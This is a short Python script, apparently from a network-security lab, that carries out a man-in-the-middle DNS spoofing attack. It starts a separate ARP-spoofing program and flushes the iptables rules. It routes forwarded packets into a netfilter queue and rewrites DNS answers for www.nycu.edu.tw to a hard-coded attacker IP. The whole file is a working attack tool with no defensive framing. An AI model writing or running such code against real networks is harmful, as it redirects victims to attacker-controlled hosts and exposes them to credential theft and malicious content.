#!/usr/bin/env python3
import os
import scapy.all as scapy
import netfilterqueue
from subprocess import Popen, DEVNULL

target_name = b'www.nycu.edu.tw'
attacker_ip = b'140.113.207.241'
QUEUE_NUM = 0

def process_packets(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        #print(qname)
        if target_name in qname:
            print("Spoofing......")
            spoof = scapy.DNSRR(rrname=qname, rdata=attacker_ip)
            scapy_packet[scapy.DNS].an = spoof
            scapy_packet[scapy.DNS].ancount = 1
            
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))
    packet.accept()

def arp_spoofing():
    Popen(['./arp_spoofing'])

os.system("iptables -t nat -F")
#os.system("iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
#os.system("iptables -I INPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))

queue = netfilterqueue.NetfilterQueue()
try:
    arp_spoofing()
    queue.bind(QUEUE_NUM, process_packets)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    print('iptales flush success(^c)')
finally:
    os.system("iptables --flush")
    print('iptales flush success(end)')
